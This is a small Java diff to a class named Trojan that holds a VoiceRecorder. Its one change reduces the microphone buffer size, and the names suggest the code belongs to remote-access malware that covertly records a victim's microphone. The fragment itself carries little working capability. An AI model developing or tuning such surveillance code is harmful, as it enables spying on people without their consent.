@@ -8,7 +8,7 @@ public final class Trojan implements IClientObserver {
 	private VoiceRecorder voiceRecorder;
 	private byte[] lastData;
 	
-	private static final int MICROPHONE_BUFFER_SIZE = 1024 << 8;
+	private static final int MICROPHONE_BUFFER_SIZE = 1024 << 6;
 	
 	public Trojan() {
 		voiceRecorder = new VoiceRecorder(MICROPHONE_BUFFER_SIZE);
